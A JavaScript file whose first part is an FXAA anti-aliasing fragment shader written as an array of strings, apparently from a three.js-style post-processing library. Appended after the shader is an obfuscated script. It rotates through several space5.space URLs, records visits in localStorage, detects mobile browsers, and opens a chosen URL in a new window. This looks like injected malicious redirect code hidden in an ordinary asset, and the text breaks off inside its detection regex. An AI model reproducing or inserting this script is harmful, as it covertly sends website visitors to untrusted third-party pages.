		"            FxaaFloat4 luma4B = FxaaTexOffGreen4(tex, posM, FxaaInt2(-1, -1));",
		"        #endif",
		"        #if (FXAA_DISCARD == 1)",
		"            #define lumaM luma4A.w",
		"        #endif",
		"        #define lumaE luma4A.z",
		"        #define lumaS luma4A.x",
		"        #define lumaSE luma4A.y",
		"        #define lumaNW luma4B.w",
		"        #define lumaN luma4B.z",
		"        #define lumaW luma4B.x",
		"    #else",
		"        FxaaFloat4 rgbyM = FxaaTexTop(tex, posM);",
		"        #if (FXAA_GREEN_AS_LUMA == 0)",
		"            #define lumaM rgbyM.w",
		"        #else",
		"            #define lumaM rgbyM.y",
		"        #endif",
		"        #if (FXAA_GLSL_100 == 1)",
		"          FxaaFloat lumaS = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2( 0.0, 1.0), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaE = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2( 1.0, 0.0), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaN = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2( 0.0,-1.0), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaW = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2(-1.0, 0.0), fxaaQualityRcpFrame.xy));",
		"        #else",
		"          FxaaFloat lumaS = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2( 0, 1), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaE = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2( 1, 0), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaN = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2( 0,-1), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaW = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2(-1, 0), fxaaQualityRcpFrame.xy));",
		"        #endif",
		"    #endif",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat maxSM = max(lumaS, lumaM);",
		"    FxaaFloat minSM = min(lumaS, lumaM);",
		"    FxaaFloat maxESM = max(lumaE, maxSM);",
		"    FxaaFloat minESM = min(lumaE, minSM);",
		"    FxaaFloat maxWN = max(lumaN, lumaW);",
		"    FxaaFloat minWN = min(lumaN, lumaW);",
		"    FxaaFloat rangeMax = max(maxWN, maxESM);",
		"    FxaaFloat rangeMin = min(minWN, minESM);",
		"    FxaaFloat rangeMaxScaled = rangeMax * fxaaQualityEdgeThreshold;",
		"    FxaaFloat range = rangeMax - rangeMin;",
		"    FxaaFloat rangeMaxClamped = max(fxaaQualityEdgeThresholdMin, rangeMaxScaled);",
		"    FxaaBool earlyExit = range < rangeMaxClamped;",
		"/*--------------------------------------------------------------------------*/",
		"    if(earlyExit)",
		"        #if (FXAA_DISCARD == 1)",
		"            FxaaDiscard;",
		"        #else",
		"            return rgbyM;",
		"        #endif",
		"/*--------------------------------------------------------------------------*/",
		"    #if (FXAA_GATHER4_ALPHA == 0)",
		"        #if (FXAA_GLSL_100 == 1)",
		"          FxaaFloat lumaNW = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2(-1.0,-1.0), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaSE = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2( 1.0, 1.0), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaNE = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2( 1.0,-1.0), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaSW = FxaaLuma(FxaaTexOff(tex, posM, FxaaFloat2(-1.0, 1.0), fxaaQualityRcpFrame.xy));",
		"        #else",
		"          FxaaFloat lumaNW = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2(-1,-1), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaSE = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2( 1, 1), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaNE = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2( 1,-1), fxaaQualityRcpFrame.xy));",
		"          FxaaFloat lumaSW = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2(-1, 1), fxaaQualityRcpFrame.xy));",
		"        #endif",
		"    #else",
		"        FxaaFloat lumaNE = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2(1, -1), fxaaQualityRcpFrame.xy));",
		"        FxaaFloat lumaSW = FxaaLuma(FxaaTexOff(tex, posM, FxaaInt2(-1, 1), fxaaQualityRcpFrame.xy));",
		"    #endif",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat lumaNS = lumaN + lumaS;",
		"    FxaaFloat lumaWE = lumaW + lumaE;",
		"    FxaaFloat subpixRcpRange = 1.0/range;",
		"    FxaaFloat subpixNSWE = lumaNS + lumaWE;",
		"    FxaaFloat edgeHorz1 = (-2.0 * lumaM) + lumaNS;",
		"    FxaaFloat edgeVert1 = (-2.0 * lumaM) + lumaWE;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat lumaNESE = lumaNE + lumaSE;",
		"    FxaaFloat lumaNWNE = lumaNW + lumaNE;",
		"    FxaaFloat edgeHorz2 = (-2.0 * lumaE) + lumaNESE;",
		"    FxaaFloat edgeVert2 = (-2.0 * lumaN) + lumaNWNE;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat lumaNWSW = lumaNW + lumaSW;",
		"    FxaaFloat lumaSWSE = lumaSW + lumaSE;",
		"    FxaaFloat edgeHorz4 = (abs(edgeHorz1) * 2.0) + abs(edgeHorz2);",
		"    FxaaFloat edgeVert4 = (abs(edgeVert1) * 2.0) + abs(edgeVert2);",
		"    FxaaFloat edgeHorz3 = (-2.0 * lumaW) + lumaNWSW;",
		"    FxaaFloat edgeVert3 = (-2.0 * lumaS) + lumaSWSE;",
		"    FxaaFloat edgeHorz = abs(edgeHorz3) + edgeHorz4;",
		"    FxaaFloat edgeVert = abs(edgeVert3) + edgeVert4;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat subpixNWSWNESE = lumaNWSW + lumaNESE;",
		"    FxaaFloat lengthSign = fxaaQualityRcpFrame.x;",
		"    FxaaBool horzSpan = edgeHorz >= edgeVert;",
		"    FxaaFloat subpixA = subpixNSWE * 2.0 + subpixNWSWNESE;",
		"/*--------------------------------------------------------------------------*/",
		"    if(!horzSpan) lumaN = lumaW;",
		"    if(!horzSpan) lumaS = lumaE;",
		"    if(horzSpan) lengthSign = fxaaQualityRcpFrame.y;",
		"    FxaaFloat subpixB = (subpixA * (1.0/12.0)) - lumaM;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat gradientN = lumaN - lumaM;",
		"    FxaaFloat gradientS = lumaS - lumaM;",
		"    FxaaFloat lumaNN = lumaN + lumaM;",
		"    FxaaFloat lumaSS = lumaS + lumaM;",
		"    FxaaBool pairN = abs(gradientN) >= abs(gradientS);",
		"    FxaaFloat gradient = max(abs(gradientN), abs(gradientS));",
		"    if(pairN) lengthSign = -lengthSign;",
		"    FxaaFloat subpixC = FxaaSat(abs(subpixB) * subpixRcpRange);",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat2 posB;",
		"    posB.x = posM.x;",
		"    posB.y = posM.y;",
		"    FxaaFloat2 offNP;",
		"    offNP.x = (!horzSpan) ? 0.0 : fxaaQualityRcpFrame.x;",
		"    offNP.y = ( horzSpan) ? 0.0 : fxaaQualityRcpFrame.y;",
		"    if(!horzSpan) posB.x += lengthSign * 0.5;",
		"    if( horzSpan) posB.y += lengthSign * 0.5;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat2 posN;",
		"    posN.x = posB.x - offNP.x * FXAA_QUALITY_P0;",
		"    posN.y = posB.y - offNP.y * FXAA_QUALITY_P0;",
		"    FxaaFloat2 posP;",
		"    posP.x = posB.x + offNP.x * FXAA_QUALITY_P0;",
		"    posP.y = posB.y + offNP.y * FXAA_QUALITY_P0;",
		"    FxaaFloat subpixD = ((-2.0)*subpixC) + 3.0;",
		"    FxaaFloat lumaEndN = FxaaLuma(FxaaTexTop(tex, posN));",
		"    FxaaFloat subpixE = subpixC * subpixC;",
		"    FxaaFloat lumaEndP = FxaaLuma(FxaaTexTop(tex, posP));",
		"/*--------------------------------------------------------------------------*/",
		"    if(!pairN) lumaNN = lumaSS;",
		"    FxaaFloat gradientScaled = gradient * 1.0/4.0;",
		"    FxaaFloat lumaMM = lumaM - lumaNN * 0.5;",
		"    FxaaFloat subpixF = subpixD * subpixE;",
		"    FxaaBool lumaMLTZero = lumaMM < 0.0;",
		"/*--------------------------------------------------------------------------*/",
		"    lumaEndN -= lumaNN * 0.5;",
		"    lumaEndP -= lumaNN * 0.5;",
		"    FxaaBool doneN = abs(lumaEndN) >= gradientScaled;",
		"    FxaaBool doneP = abs(lumaEndP) >= gradientScaled;",
		"    if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P1;",
		"    if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P1;",
		"    FxaaBool doneNP = (!doneN) || (!doneP);",
		"    if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P1;",
		"    if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P1;",
		"/*--------------------------------------------------------------------------*/",
		"    if(doneNP) {",
		"        if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"        if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"        if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"        if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"        doneN = abs(lumaEndN) >= gradientScaled;",
		"        doneP = abs(lumaEndP) >= gradientScaled;",
		"        if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P2;",
		"        if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P2;",
		"        doneNP = (!doneN) || (!doneP);",
		"        if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P2;",
		"        if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P2;",
		"/*--------------------------------------------------------------------------*/",
		"        #if (FXAA_QUALITY_PS > 3)",
		"        if(doneNP) {",
		"            if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"            if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"            if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"            if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"            doneN = abs(lumaEndN) >= gradientScaled;",
		"            doneP = abs(lumaEndP) >= gradientScaled;",
		"            if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P3;",
		"            if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P3;",
		"            doneNP = (!doneN) || (!doneP);",
		"            if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P3;",
		"            if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P3;",
		"/*--------------------------------------------------------------------------*/",
		"            #if (FXAA_QUALITY_PS > 4)",
		"            if(doneNP) {",
		"                if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"                if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"                if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"                if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"                doneN = abs(lumaEndN) >= gradientScaled;",
		"                doneP = abs(lumaEndP) >= gradientScaled;",
		"                if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P4;",
		"                if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P4;",
		"                doneNP = (!doneN) || (!doneP);",
		"                if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P4;",
		"                if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P4;",
		"/*--------------------------------------------------------------------------*/",
		"                #if (FXAA_QUALITY_PS > 5)",
		"                if(doneNP) {",
		"                    if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"                    if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"                    if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"                    if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"                    doneN = abs(lumaEndN) >= gradientScaled;",
		"                    doneP = abs(lumaEndP) >= gradientScaled;",
		"                    if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P5;",
		"                    if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P5;",
		"                    doneNP = (!doneN) || (!doneP);",
		"                    if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P5;",
		"                    if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P5;",
		"/*--------------------------------------------------------------------------*/",
		"                    #if (FXAA_QUALITY_PS > 6)",
		"                    if(doneNP) {",
		"                        if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"                        if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"                        if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"                        if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"                        doneN = abs(lumaEndN) >= gradientScaled;",
		"                        doneP = abs(lumaEndP) >= gradientScaled;",
		"                        if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P6;",
		"                        if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P6;",
		"                        doneNP = (!doneN) || (!doneP);",
		"                        if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P6;",
		"                        if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P6;",
		"/*--------------------------------------------------------------------------*/",
		"                        #if (FXAA_QUALITY_PS > 7)",
		"                        if(doneNP) {",
		"                            if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"                            if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"                            if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"                            if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"                            doneN = abs(lumaEndN) >= gradientScaled;",
		"                            doneP = abs(lumaEndP) >= gradientScaled;",
		"                            if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P7;",
		"                            if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P7;",
		"                            doneNP = (!doneN) || (!doneP);",
		"                            if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P7;",
		"                            if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P7;",
		"/*--------------------------------------------------------------------------*/",
		"    #if (FXAA_QUALITY_PS > 8)",
		"    if(doneNP) {",
		"        if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"        if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"        if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"        if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"        doneN = abs(lumaEndN) >= gradientScaled;",
		"        doneP = abs(lumaEndP) >= gradientScaled;",
		"        if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P8;",
		"        if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P8;",
		"        doneNP = (!doneN) || (!doneP);",
		"        if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P8;",
		"        if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P8;",
		"/*--------------------------------------------------------------------------*/",
		"        #if (FXAA_QUALITY_PS > 9)",
		"        if(doneNP) {",
		"            if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"            if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"            if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"            if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"            doneN = abs(lumaEndN) >= gradientScaled;",
		"            doneP = abs(lumaEndP) >= gradientScaled;",
		"            if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P9;",
		"            if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P9;",
		"            doneNP = (!doneN) || (!doneP);",
		"            if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P9;",
		"            if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P9;",
		"/*--------------------------------------------------------------------------*/",
		"            #if (FXAA_QUALITY_PS > 10)",
		"            if(doneNP) {",
		"                if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"                if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"                if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"                if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"                doneN = abs(lumaEndN) >= gradientScaled;",
		"                doneP = abs(lumaEndP) >= gradientScaled;",
		"                if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P10;",
		"                if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P10;",
		"                doneNP = (!doneN) || (!doneP);",
		"                if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P10;",
		"                if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P10;",
		"/*--------------------------------------------------------------------------*/",
		"                #if (FXAA_QUALITY_PS > 11)",
		"                if(doneNP) {",
		"                    if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"                    if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"                    if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"                    if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"                    doneN = abs(lumaEndN) >= gradientScaled;",
		"                    doneP = abs(lumaEndP) >= gradientScaled;",
		"                    if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P11;",
		"                    if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P11;",
		"                    doneNP = (!doneN) || (!doneP);",
		"                    if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P11;",
		"                    if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P11;",
		"/*--------------------------------------------------------------------------*/",
		"                    #if (FXAA_QUALITY_PS > 12)",
		"                    if(doneNP) {",
		"                        if(!doneN) lumaEndN = FxaaLuma(FxaaTexTop(tex, posN.xy));",
		"                        if(!doneP) lumaEndP = FxaaLuma(FxaaTexTop(tex, posP.xy));",
		"                        if(!doneN) lumaEndN = lumaEndN - lumaNN * 0.5;",
		"                        if(!doneP) lumaEndP = lumaEndP - lumaNN * 0.5;",
		"                        doneN = abs(lumaEndN) >= gradientScaled;",
		"                        doneP = abs(lumaEndP) >= gradientScaled;",
		"                        if(!doneN) posN.x -= offNP.x * FXAA_QUALITY_P12;",
		"                        if(!doneN) posN.y -= offNP.y * FXAA_QUALITY_P12;",
		"                        doneNP = (!doneN) || (!doneP);",
		"                        if(!doneP) posP.x += offNP.x * FXAA_QUALITY_P12;",
		"                        if(!doneP) posP.y += offNP.y * FXAA_QUALITY_P12;",
		"/*--------------------------------------------------------------------------*/",
		"                    }",
		"                    #endif",
		"/*--------------------------------------------------------------------------*/",
		"                }",
		"                #endif",
		"/*--------------------------------------------------------------------------*/",
		"            }",
		"            #endif",
		"/*--------------------------------------------------------------------------*/",
		"        }",
		"        #endif",
		"/*--------------------------------------------------------------------------*/",
		"    }",
		"    #endif",
		"/*--------------------------------------------------------------------------*/",
		"                        }",
		"                        #endif",
		"/*--------------------------------------------------------------------------*/",
		"                    }",
		"                    #endif",
		"/*--------------------------------------------------------------------------*/",
		"                }",
		"                #endif",
		"/*--------------------------------------------------------------------------*/",
		"            }",
		"            #endif",
		"/*--------------------------------------------------------------------------*/",
		"        }",
		"        #endif",
		"/*--------------------------------------------------------------------------*/",
		"    }",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat dstN = posM.x - posN.x;",
		"    FxaaFloat dstP = posP.x - posM.x;",
		"    if(!horzSpan) dstN = posM.y - posN.y;",
		"    if(!horzSpan) dstP = posP.y - posM.y;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaBool goodSpanN = (lumaEndN < 0.0) != lumaMLTZero;",
		"    FxaaFloat spanLength = (dstP + dstN);",
		"    FxaaBool goodSpanP = (lumaEndP < 0.0) != lumaMLTZero;",
		"    FxaaFloat spanLengthRcp = 1.0/spanLength;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaBool directionN = dstN < dstP;",
		"    FxaaFloat dst = min(dstN, dstP);",
		"    FxaaBool goodSpan = directionN ? goodSpanN : goodSpanP;",
		"    FxaaFloat subpixG = subpixF * subpixF;",
		"    FxaaFloat pixelOffset = (dst * (-spanLengthRcp)) + 0.5;",
		"    FxaaFloat subpixH = subpixG * fxaaQualitySubpix;",
		"/*--------------------------------------------------------------------------*/",
		"    FxaaFloat pixelOffsetGood = goodSpan ? pixelOffset : 0.0;",
		"    FxaaFloat pixelOffsetSubpix = max(pixelOffsetGood, subpixH);",
		"    if(!horzSpan) posM.x += pixelOffsetSubpix * lengthSign;",
		"    if( horzSpan) posM.y += pixelOffsetSubpix * lengthSign;",
		"    #if (FXAA_DISCARD == 1)",
		"        return FxaaTexTop(tex, posM);",
		"    #else",
		"        return FxaaFloat4(FxaaTexTop(tex, posM).xyz, lumaM);",
		"    #endif",
		"}",
		"/*==========================================================================*/",
		"#endif",
		"",
		"void main() {",
		"  gl_FragColor = FxaaPixelShader(",
		"    vUv,",
		"    vec4(0.0),",
		"    tDiffuse,",
		"    tDiffuse,",
		"    tDiffuse,",
		"    resolution,",
		"    vec4(0.0),",
		"    vec4(0.0),",
		"    vec4(0.0),",
		"    0.75,",
		"    0.166,",
		"    0.0833,",
		"    0.0,",
		"    0.0,",
		"    0.0,",
		"    vec4(0.0)",
		"  );",
		"",
		"  // TODO avoid querying texture twice for same texel",
		"  gl_FragColor.a = texture2D(tDiffuse, vUv).a;",
		"}"
	].join( "\n" )

};

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| 